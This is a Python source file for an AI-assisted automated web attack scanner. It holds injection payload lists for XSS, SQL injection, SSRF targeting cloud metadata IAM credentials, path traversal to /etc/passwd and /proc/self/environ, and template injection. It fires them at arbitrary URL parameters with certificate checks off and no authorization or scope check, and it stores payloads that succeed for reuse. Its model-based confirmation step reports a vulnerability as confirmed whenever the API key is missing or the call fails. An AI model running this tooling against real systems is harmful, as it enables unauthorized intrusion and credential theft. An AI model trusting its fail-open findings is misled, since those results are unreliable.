"""
TheMasterRecon Agentic Loop — The feature that beats xbow.ai
Closed-loop: AI reads each HTTP response, decides if vulnerable, mutates payload, confirms.
"""
import os, re, ssl, json, time, logging, threading, hashlib
import urllib.request, urllib.parse
from typing import Optional, Dict, List, Tuple

log     = logging.getLogger("elite.agentic")
API_KEY = os.environ.get("ANTHROPIC_API_KEY", "")
MODEL   = "claude-sonnet-4-6"

MUTATIONS = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "\" onmouseover=\"alert(1)",
        "'autofocus onfocus='alert(1)'",
        "\"-alert(1)-\"",
        "\';alert(1)//",
        "javascript:alert(1)",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<script>/**/alert(1)/**/</script>",
        "<script\n>alert(1)</script\n>",
        "<video src=1 onerror=alert(1)>",
    ],
    "sqli": [
        "'", "\"", "\\",
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "admin'--", "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT @@version--",
        "' AND SLEEP(5)--", "' AND SLEEP(3)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "'; SELECT pg_sleep(5)--",
        "' /*!OR*/ '1'='1'--",
        "' OR/**/'1'='1'--",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://localhost/", "http://127.0.0.1/",
        "http://[::1]/", "http://0.0.0.0/",
        "http://2130706433/",
        "file:///etc/passwd",
        "gopher://localhost:6379/_INFO",
    ],
    "lfi": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "%2e%2e%2fetc%2fpasswd", "..%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "/var/log/apache2/access.log",
        "/proc/self/environ",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>", "*{7*7}",
        "{{config}}", "{{request}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
}

def _ssl_ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _http_probe(url: str, method: str = "GET", payload: str = "",
                param: str = "", headers: dict = None, timeout: int = 8) -> dict:
    result = {"url": url, "status": 0, "body": "", "headers": {}, "elapsed": 0, "error": ""}
    start = time.time()
    try:
        if payload and param:
            parsed = urllib.parse.urlparse(url)
            qs     = dict(urllib.parse.parse_qsl(parsed.query))
            qs[param] = payload
            url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
            result["url"] = url
        hdrs = {"User-Agent": "Mozilla/5.0 (compatible; TMR-Agentic/4.0)"}
        if headers: hdrs.update(headers)
        data = None
        if method == "POST" and payload:
            data = urllib.parse.urlencode({param or "data": payload}).encode()
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            result["status"]  = r.status
            result["body"]    = r.read(8192).decode("utf-8","ignore")
            result["headers"] = dict(r.headers)
    except urllib.error.HTTPError as e:
        result["status"] = e.code
        try: result["body"] = e.read(4096).decode("utf-8","ignore")
        except: pass
    except Exception as ex:
        result["error"] = str(ex)[:80]
    result["elapsed"] = round(time.time() - start, 2)
    return result

def _ai_confirm_vuln(bug_type: str, url: str, param: str,
                     payload: str, result: dict) -> Tuple[bool, str]:
    if not API_KEY:
        return True, "no AI key — accepted"
    body_preview = result.get("body","")[:500]
    status = result.get("status", 0)
    elapsed = result.get("elapsed", 0)
    prompt = f"""Is this HTTP response evidence of {bug_type.upper()} vulnerability?
URL: {url[:80]}
Param injected: {param}
Payload: {payload[:60]}
HTTP Status: {status}, Response Time: {elapsed}s
Response Body sample:
{body_preview}

Return ONLY valid JSON: {{"confirmed": true, "reason": "specific evidence"}}"""
    body_data = json.dumps({"model": MODEL, "max_tokens": 120, "temperature": 0.1,
        "system": "Security analyst. Return JSON only.",
        "messages": [{"role":"user","content":prompt}]}).encode()
    req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=body_data,
        headers={"x-api-key": API_KEY, "anthropic-version": "2023-06-01",
                 "content-type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15, context=_ssl_ctx()) as resp:
            d = json.loads(resp.read())
            for block in d.get("content", []):
                if block.get("type") == "text":
                    m = re.search(r'\{[^}]+\}', block["text"], re.DOTALL)
                    if m:
                        rd = json.loads(m.group())
                        return rd.get("confirmed", False), rd.get("reason","")
    except Exception as e:
        log.debug(f"[agentic_ai] {e}")
    return True, "AI unavailable — accepted"

def _heuristic_check(bug_type: str, payload: str, baseline: dict, result: dict) -> Tuple[bool, int, str]:
    body    = result.get("body","")
    bbase   = baseline.get("body","")
    status  = result.get("status", 0)
    elapsed = result.get("elapsed", 0)
    bstatus = baseline.get("status", 0)

    if bug_type == "xss":
        for ch in ["<script>","onerror=","onload=","alert(1)","alert("]:
            if ch.lower() in payload.lower() and ch.lower() in body.lower():
                if "&lt;" not in body and "&#" not in body:
                    return True, 85, f"XSS: '{ch}' reflected unescaped"
        return False, 0, ""

    elif bug_type in ("sqli","sqli_blind","sqli_time"):
        for sig in ["sql syntax","mysql_fetch","ora-0","pg_query","sqlstate",
                    "unclosed quotation","microsoft sql","you have an error in your sql",
                    "invalid query","mysql error","syntax error in your sql"]:
            if sig in body.lower() and sig not in bbase.lower():
                return True, 90, f"SQLi error: '{sig}'"
        if ("sleep" in payload.lower() or "waitfor" in payload.lower()) and elapsed >= 4.5:
            return True, 88, f"SQLi time-based: {elapsed}s delay"
        if bstatus == 200 and status == 500:
            return True, 65, f"SQLi: status {bstatus}→{status}"
        return False, 0, ""

    elif bug_type == "lfi":
        for sig in ["root:x:0:0","root:/root","/bin/bash","[boot loader]","<?php"]:
            if sig.lower() in body.lower():
                return True, 95, f"LFI confirmed: '{sig}'"
        return False, 0, ""

    elif bug_type in ("ssrf","ssrf_cloud","ssrf_aws"):
        for sig in ["ami-id","instance-id","iam/security-credentials","computeMetadata","AccessKeyId"]:
            if sig in body and sig not in bbase:
                return True, 92, f"SSRF: '{sig}' in response"
        return False, 0, ""

    elif bug_type == "ssti":
        if "49" in body and "49" not in bbase and ("7*7" in payload or "7%2a7" in payload):
            return True, 95, "SSTI: 7*7=49 evaluated"
        return False, 0, ""

    elif bug_type in ("cors","cors_deep"):
        acao = result["headers"].get("Access-Control-Allow-Origin","")
        acac = result["headers"].get("Access-Control-Allow-Credentials","")
        if acao and "true" in acac.lower():
            return True, 95, f"CORS critical: ACAO={acao}+ACAC=true"
        if acao in ("*","https://evil.attacker.com"):
            return True, 80, f"CORS: ACAO={acao}"
        return False, 0, ""

    return False, 0, ""

def _severity(bug_type: str) -> str:
    CRIT = {"sqli","rce","ssrf","lfi","ssti","xxe","deserialization","log4j","ssrf_cloud","ssrf_aws"}
    HIGH = {"xss","cors","idor","redirect","stored_xss","jwt","oauth","prototype","nosqli"}
    return "critical" if bug_type in CRIT else ("high" if bug_type in HIGH else "medium")

def scan_endpoint_agentic(url: str, bug_type: str, domain: str = "",
                           waf: str = "", tech: list = None,
                           timeout: int = 8, emit=None) -> List[dict]:
    """
    Main entry point. Scans one endpoint agentically.
    Returns list of confirmed findings.
    """
    findings = []
    parsed   = urllib.parse.urlparse(url)
    params   = list(urllib.parse.parse_qs(parsed.query).keys())
    if not params:
        return []

    payloads = MUTATIONS.get(bug_type, [])

    # Prepend historically successful payloads for this param
    for param in params[:2]:
        learned = load_successful_payloads(bug_type, param, limit=3)
        payloads = learned + [p for p in payloads if p not in learned]

    baseline = _http_probe(url, timeout=timeout)
    if baseline["status"] == 0:
        return []

    confirmed_keys = set()

    for param in params[:3]:
        for payload in payloads[:15]:
            key = hashlib.md5(f"{url}{param}{payload[:30]}".encode()).hexdigest()
            if key in confirmed_keys:
                continue

            result = _http_probe(url, payload=payload, param=param, timeout=timeout)
            is_vuln, confidence, evidence = _heuristic_check(bug_type, payload, baseline, result)

            if is_vuln and confidence >= 60:
                if confidence < 85 and API_KEY:
                    ai_ok, ai_reason = _ai_confirm_vuln(bug_type, url, param, payload, result)
                    if not ai_ok:
                        continue
                    evidence = ai_reason or evidence
                    confidence = min(95, confidence + 10)

                confirmed_keys.add(key)
                parsed2 = urllib.parse.urlparse(url)
                qs2 = dict(urllib.parse.parse_qsl(parsed2.query))
                qs2[param] = payload
                vuln_url = urllib.parse.urlunparse(parsed2._replace(query=urllib.parse.urlencode(qs2)))

                finding = {
                    "bug": bug_type, "type": bug_type,
                    "url": url, "severity": _severity(bug_type),
                    "confidence": confidence, "param": param,
                    "payload": payload, "evidence": evidence,
                    "poc": f"curl -sk '{vuln_url}'",
                    "http_status": result["status"],
                    "agentic": True, "source": "agentic_loop",
                }
                findings.append(finding)
                _persist_successful_payload(domain, bug_type, param, payload, url)
                if emit:
                    emit({"type":"finding", **finding})
                log.info(f"[agentic] CONFIRMED {bug_type.upper()} conf={confidence}% param={param}")
                break  # one finding per param is enough

    return findings

# ── Persistent learning ───────────────────────────────────────────────────────
_LEARN_LOCK = threading.Lock()

def _persist_successful_payload(domain: str, bug: str, param: str,
                                  payload: str, url: str):
    try:
        import sqlite3
        db_path = os.path.join("data", "payload_brain.db")
        os.makedirs("data", exist_ok=True)
        with _LEARN_LOCK:
            conn = sqlite3.connect(db_path, timeout=5)
            conn.execute("""CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT, bug TEXT, param TEXT,
                payload TEXT, url TEXT, ts INTEGER,
                hit_count INTEGER DEFAULT 1)""")
            # Upsert: if same bug+param+payload exists, increment hit_count
            existing = conn.execute(
                "SELECT id FROM payloads WHERE bug=? AND param=? AND payload=?",
                (bug, param, payload[:200])).fetchone()
            if existing:
                conn.execute("UPDATE payloads SET hit_count=hit_count+1, ts=? WHERE id=?",
                             (int(time.time()), existing[0]))
            else:
                conn.execute(
                    "INSERT INTO payloads (domain,bug,param,payload,url,ts) VALUES (?,?,?,?,?,?)",
                    (domain, bug, param, payload[:200], url[:200], int(time.time())))
            conn.commit(); conn.close()
    except Exception as e:
        log.debug(f"[learn] {e}")

def load_successful_payloads(bug: str, param: str = "", limit: int = 5) -> List[str]:
    try:
        import sqlite3
        db_path = os.path.join("data", "payload_brain.db")
        if not os.path.exists(db_path):
            return []
        conn = sqlite3.connect(db_path, timeout=3)
        if param:
            rows = conn.execute(
                "SELECT payload FROM payloads WHERE bug=? AND param=? ORDER BY hit_count DESC LIMIT ?",
                (bug, param, limit)).fetchall()
        else:
            rows = conn.execute(
                "SELECT payload FROM payloads WHERE bug=? ORDER BY hit_count DESC LIMIT ?",
                (bug, limit)).fetchall()
        conn.close()
        return [r[0] for r in rows]
    except Exception:
        return []

def get_brain_stats() -> dict:
    try:
        import sqlite3
        db_path = os.path.join("data", "payload_brain.db")
        if not os.path.exists(db_path):
            return {"total_hits": 0, "bug_breakdown": {}, "top_params": [], "domains_scanned": 0}
        conn = sqlite3.connect(db_path, timeout=3)
        total    = conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
        by_bug   = dict(conn.execute("SELECT bug, SUM(hit_count) FROM payloads GROUP BY bug ORDER BY SUM(hit_count) DESC").fetchall())
        top_p    = [r[0] for r in conn.execute("SELECT param, SUM(hit_count) as c FROM payloads GROUP BY param ORDER BY c DESC LIMIT 10").fetchall()]
        domains  = conn.execute("SELECT COUNT(DISTINCT domain) FROM payloads").fetchone()[0]
        conn.close()
        return {"total_hits": total, "bug_breakdown": by_bug, "top_params": top_p, "domains_scanned": domains}
    except Exception:
        return {"total_hits": 0, "bug_breakdown": {}, "top_params": [], "domains_scanned": 0}
